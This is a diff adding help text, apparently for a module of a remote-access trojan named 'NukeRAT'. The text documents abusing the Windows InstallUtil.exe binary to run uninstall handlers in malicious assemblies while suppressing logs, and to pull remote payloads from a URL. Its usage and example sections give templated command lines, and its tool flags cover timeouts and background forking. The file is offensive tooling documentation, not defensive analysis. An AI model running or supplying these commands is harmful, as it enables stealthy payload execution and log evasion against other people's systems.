@@ -1,0 +1,19 @@
+ABOUT
+    .NET installer tool for assembly install/uninstall hooks.
+    LOLBAS invokes uninstall handlers in malicious assemblies without
+    logging and can pull remote payloads into INetCache.
+
+USAGE:
+    InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll}
+    InstallUtil.exe {REMOTEURL}
+
+EXAMPLES:
+    InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll}
+    InstallUtil.exe {REMOTEURL}
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll}
